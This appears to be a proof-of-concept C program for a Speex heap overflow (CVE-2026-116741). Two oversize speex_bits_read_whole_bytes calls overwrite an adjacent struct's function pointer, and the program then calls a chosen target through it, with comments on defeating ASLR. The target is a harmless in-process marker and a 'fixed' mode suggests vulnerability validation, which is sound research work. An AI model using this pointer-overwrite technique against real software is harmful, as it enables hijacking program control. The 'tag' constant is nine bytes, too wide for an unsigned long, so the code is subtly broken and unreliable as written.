/* Pointer-control probe for CVE-2026-116741. Same conditions as adjacent.c:
 * non-owner SpeexBits, two sequential oversize reads, glibc sequential
 * malloc(16) adjacency, no free of corrupted metadata. The neighbour is a
 * live 16-byte struct whose first field is a function pointer; the second
 * read's bytes 8..15 land on that field. Benign in-process marker only:
 * this is rung-4 mechanics, not an r5 wire/command claim. */
#include <speex/speex_bits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUFSZ 16

struct victim {
   void (*fn)(void);
   unsigned long tag;
};

static int marker_called = 0;
static void benign_marker(void)
{
   marker_called = 1;
   puts("BENIGN_MARKER_CALLED");
}
static void noop(void) { }

int main(int argc, char **argv)
{
   int fixed = argc > 1 && strcmp(argv[1], "fixed") == 0;
   char *buf = (char *)malloc(BUFSZ);
   struct victim *v = (struct victim *)malloc(BUFSZ);
   SpeexBits bits;
   char seed[8], p1[16], p2[16];
   void (*fp)(void);
   void (*target)(void) = &benign_marker;
   int i;

   if (!buf || !v)
      return 90;
   memset(buf, 0, BUFSZ);
   memset(v, 0, sizeof(*v));
   v->fn = noop;
   v->tag = 0x5a5a5a5a5a5a5a5a5aul;
   printf("delta=%td\n", (char *)v - buf);
   if ((char *)v - buf != 32)
      return 3;                  /* layout assumption failed: UNKNOWN */

   speex_bits_init_buffer(&bits, buf, BUFSZ);
   for (i = 0; i < 8; i++)
      seed[i] = (char)(0x11 + i);
   speex_bits_read_whole_bytes(&bits, seed, 8);
   for (i = 0; i < 16; i++)
      p1[i] = (char)('A' + i);
   speex_bits_read_whole_bytes(&bits, p1, 16);   /* first OOB write */
   for (i = 0; i < 8; i++)
      p2[i] = (char)(0x21 + i);
   /* p2[8..15] land at v->fn (buf+32). The address is resolved at runtime
    * and copied from a stored pointer value, so ASLR does not matter. */
   memcpy(p2 + 8, &target, sizeof(target));
   printf("target=%p bytes=", (void *)target);
   for (i = 8; i < 16; i++)
      printf("%02x", (unsigned char)p2[i]);
   printf("\n");
   speex_bits_read_whole_bytes(&bits, p2, 16);   /* second OOB write */
   fp = v->fn;
   printf("vfn=%p tag=%016lx\n", (void *)fp, v->tag);
   if (fp == target)
      fp();                      /* benign marker through overwritten pointer */
   printf("marker_called=%d\n", marker_called);

   return marker_called == (fixed ? 0 : 1) &&
          v->tag == 0x5a5a5a5a5a5a5a5a5aul ? 0 : 1;
}
